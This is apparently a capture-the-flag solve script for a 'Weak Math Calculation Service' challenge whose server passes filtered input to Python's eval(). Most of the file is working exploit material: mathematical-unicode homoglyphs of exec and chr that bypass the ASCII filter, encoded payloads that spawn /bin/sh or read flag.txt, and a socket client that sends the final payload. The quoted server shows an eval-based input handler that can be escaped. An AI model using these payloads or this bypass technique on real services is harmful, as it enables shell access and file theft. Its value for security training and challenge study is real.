"""
Server:
import re
from string import ascii_letters, punctuation
from itertools import chain

def calculate(expression):
    sanitized_expression = sanitize_input(expression)
    
    if not sanitized_expression:
        return "Invalid expression. Allowed characters: numbers and basic operators."

    print("Calculating: ", sanitized_expression)
    try:
        result = eval(sanitized_expression)
        return result
    except Exception as e:
        return f"Error: {e}"

def sanitize_input(expression):
    dangerous_chars = (ascii_letters + punctuation).translate(str.maketrans("", "", "+-*/%=<>!()"))
    dangerous_chars += ''.join([chr(x) for x in chain(range(1, 32), range(127, 255))])

    if any(char in expression for char in dangerous_chars):
        return None

    # Handle the ** operator first to avoid splitting it
    expression = re.sub(r'(\d)(\*\*)', r'\1 ** ', expression)  # Add space after a digit before **
    expression = re.sub(r'(\*\*)(\d)', r'** \2', expression)   # Add space before a digit after **

    # Now handle the single operators +, -, *, /
    expression = re.sub(r'(\d)([+\-*/])', r'\1 \2 ', expression)  # Add space after a digit before an operator
    expression = re.sub(r'([+\-*/])(\d)', r'\1 \2', expression)   # Add space before a digit after an operator
    
    return expression

def main():
    print("Welcome to the Weak Math Calculation Service!")
    print("Enter expressions like '2+2' or '5*3'. Be careful, programmers are obsolete!")
    print("Everything can be done with LLMs.")

    while True:
        try:
            # Taking user input from stdin
            expression = input("Enter your math expression: ").strip()

            if not expression:
                print("No expression provided. Exiting.")
                break

            result = calculate(expression)

            print(f"Result: {result}")
        
        except (KeyboardInterrupt, EOFError):
            print("\nExiting...")
            break

if __name__ == "__main__":
    main()
"""

"""
# funny unicode
ord("𝚌")
120460
for i in range(200):
  chr(120400 + i)

'𝙐'
'𝙑'
'𝙒'
'𝙓'
'𝙔'
'𝙕'
'𝙖'
'𝙗'
'𝙘'
'𝙙'
'𝙚'
'𝙛'
'𝙜'
'𝙝'
'𝙞'
'𝙟'
'𝙠'
'𝙡'
'𝙢'
'𝙣'
'𝙤'
'𝙥'
'𝙦'
'𝙧'
'𝙨'
'𝙩'
'𝙪'
'𝙫'
'𝙬'
'𝙭'
'𝙮'
'𝙯'
'𝙰'
'𝙱'
'𝙲'
'𝙳'
'𝙴'
'𝙵'
'𝙶'
'𝙷'
'𝙸'
'𝙹'
'𝙺'
'𝙻'
'𝙼'
'𝙽'
'𝙾'
'𝙿'
'𝚀'
'𝚁'
'𝚂'
'𝚃'
'𝚄'
'𝚅'
'𝚆'
'𝚇'
'𝚈'
'𝚉'
'𝚊'
'𝚋'
'𝚌'
'𝚍'
'𝚎'
'𝚏'
'𝚐'
'𝚑'
'𝚒'
'𝚓'
'𝚔'
'𝚕'
'𝚖'
'𝚗'
'𝚘'
'𝚙'
'𝚚'
'𝚛'
'𝚜'
'𝚝'
'𝚞'
'𝚟'
'𝚠'
'𝚡'
'𝚢'
'𝚣'
'𝚤'
'𝚥'
'\U0001d6a6'
'\U0001d6a7'
'𝚨'
'𝚩'
'𝚪'
'𝚫'
'𝚬'
'𝚭'
'𝚮'
'𝚯'
'𝚰'
'𝚱'
'𝚲'
'𝚳'
'𝚴'
'𝚵'
'𝚶'
'𝚷'
'𝚸'
'𝚹'
'𝚺'
'𝚻'
'𝚼'
'𝚽'
'𝚾'
'𝚿'
'𝛀'
'𝛁'
'𝛂'
'𝛃'
'𝛄'
'𝛅'
'𝛆'
'𝛇'
'𝛈'
'𝛉'
'𝛊'
'𝛋'
'𝛌'
'𝛍'
'𝛎'
'𝛏'
'𝛐'
'𝛑'
'𝛒'
'𝛓'
'𝛔'
'𝛕'
'𝛖'
'𝛗'
'𝛘'
'𝛙'
'𝛚'
'𝛛'
'𝛜'
'𝛝'
'𝛞'
'𝛟'
'𝛠'
'𝛡'
'𝛢'
'𝛣'
'𝛤'
'𝛥'
'𝛦'
'𝛧'
'𝛨'
'𝛩'
'𝛪'
'𝛫'
'𝛬'
'𝛭'
'𝛮'
'𝛯'
'𝛰'
'𝛱'
'𝛲'
'𝛳'
'𝛴'
'𝛵'
'𝛶'
'𝛷'
'𝛸'
'𝛹'
'𝛺'
'𝛻'
'𝛼'
'𝛽'
'𝛾'
'𝛿'
'𝜀'
'𝜁'
'𝜂'
'𝜃'
'𝜄'
'𝜅'
'𝜆'
'𝜇'
'𝜈'
'𝜉'
'𝜊'
'𝜋'
'𝜌'
'𝜍'
'𝜎'
'𝜏'
'𝜐'
'𝜑'
'𝜒'
'𝜓'
'𝜔'
'𝜕'
'𝜖'
'𝜗'

def convert(input_string):
    # funny unicode
    return ''.join(f"𝚌𝚑𝚛({ord(c)}) +" for c in input_string)

# '__import__("os").system("/bin/sh")'
(𝚌𝚑𝚛(95) + 𝚌𝚑𝚛(95) + 𝚌𝚑𝚛(105) + 𝚌𝚑𝚛(109) + 𝚌𝚑𝚛(112) + 𝚌𝚑𝚛(111) + 𝚌𝚑𝚛(114) + 𝚌𝚑𝚛(116) + 𝚌𝚑𝚛(95) + 𝚌𝚑𝚛(95) + 𝚌𝚑𝚛(40) + 𝚌𝚑𝚛(34) + 𝚌𝚑𝚛(111) + 𝚌𝚑𝚛(115) + 𝚌𝚑𝚛(34) + 𝚌𝚑𝚛(41) + 𝚌𝚑𝚛(46) + 𝚌𝚑𝚛(115) + 𝚌𝚑𝚛(121) + 𝚌𝚑𝚛(115) + 𝚌𝚑𝚛(116) + 𝚌𝚑𝚛(101) +  𝚌𝚑𝚛(109) + 𝚌𝚑𝚛(40) + 𝚌𝚑𝚛(34) + 𝚌𝚑𝚛(47) + 𝚌𝚑𝚛(98) + 𝚌𝚑𝚛(105) + 𝚌𝚑𝚛(110) + 𝚌𝚑𝚛(47) + 𝚌𝚑𝚛(115) + 𝚌𝚑𝚛(104) +  𝚌𝚑𝚛(34) + 𝚌𝚑𝚛(41))

# __import__("pty").spawn("/bin/sh")
# no pty device
convert('__import__("pty").spawn("/bin/sh")')
𝚎𝚡𝚎𝚌(𝚌𝚑𝚛(95) + 𝚌𝚑𝚛(95) + 𝚌𝚑𝚛(105) + 𝚌𝚑𝚛(109) + 𝚌𝚑𝚛(112) + 𝚌𝚑𝚛(111) + 𝚌𝚑𝚛(114) + 𝚌𝚑𝚛(116) + 𝚌𝚑𝚛(95) + 𝚌𝚑𝚛(95) + 𝚌𝚑𝚛(40) + 𝚌𝚑𝚛(34) + 𝚌𝚑𝚛(112) + 𝚌𝚑𝚛(116) + 𝚌𝚑𝚛(121) + 𝚌𝚑𝚛(34) + 𝚌𝚑𝚛(41) + 𝚌𝚑𝚛(46) + 𝚌𝚑𝚛(115) + 𝚌𝚑𝚛(112) + 𝚌𝚑𝚛(97) + 𝚌𝚑𝚛(119) + 𝚌𝚑𝚛(110) + 𝚌𝚑𝚛(40) + 𝚌𝚑𝚛(34) + 𝚌𝚑𝚛(47) + 𝚌𝚑𝚛(98) + 𝚌𝚑𝚛(105) + 𝚌𝚑𝚛(110) + 𝚌𝚑𝚛(47) + 𝚌𝚑𝚛(115) + 𝚌𝚑𝚛(104) + 𝚌𝚑𝚛(34) + 𝚌𝚑𝚛(41))

################### solved

# 'print(__import__("os").listdir("."))'
convert('print(__import__("os").listdir("."))')
𝚎𝚡𝚎𝚌(𝚌𝚑𝚛(112) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(105) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(95) +𝚌𝚑𝚛(95) +𝚌𝚑𝚛(105) +𝚌𝚑𝚛(109) +𝚌𝚑𝚛(112) +𝚌𝚑𝚛(111) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(95) +𝚌𝚑𝚛(95) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(111) +𝚌𝚑𝚛(115) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(108) +𝚌𝚑𝚛(105) +𝚌𝚑𝚛(115) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(100) +𝚌𝚑𝚛(105) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(41))

# print(open("flag.txt").read())
convert('print(open("flag.txt").read())')
𝚎𝚡𝚎𝚌(𝚌𝚑𝚛(112) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(105) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(111) +𝚌𝚑𝚛(112) +𝚌𝚑𝚛(101) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(102) +𝚌𝚑𝚛(108) +𝚌𝚑𝚛(97) +𝚌𝚑𝚛(103) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(120) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(101) +𝚌𝚑𝚛(97) +𝚌𝚑𝚛(100) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(41))

# nc calc.nc.jctf.pro 1337
# 𝚎𝚡𝚎𝚌(𝚌𝚑𝚛(112) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(105) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(111) +𝚌𝚑𝚛(112) +𝚌𝚑𝚛(101) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(102) +𝚌𝚑𝚛(108) +𝚌𝚑𝚛(97) +𝚌𝚑𝚛(103) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(120) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(101) +𝚌𝚑𝚛(97) +𝚌𝚑𝚛(100) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(41))
"""

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr = ('localhost', 1337)
sock.connect(addr)
exploit = "𝚎𝚡𝚎𝚌(𝚌𝚑𝚛(112) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(105) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(111) +𝚌𝚑𝚛(112) +𝚌𝚑𝚛(101) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(102) +𝚌𝚑𝚛(108) +𝚌𝚑𝚛(97) +𝚌𝚑𝚛(103) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(120) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(101) +𝚌𝚑𝚛(97) +𝚌𝚑𝚛(100) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(41))"

sock.recv(4096)

sock.sendall(exploit.encode("utf-8"))
sock.send(b"\n")

data = sock.recv(4096)
print(data.decode("utf-8"))
sock.close()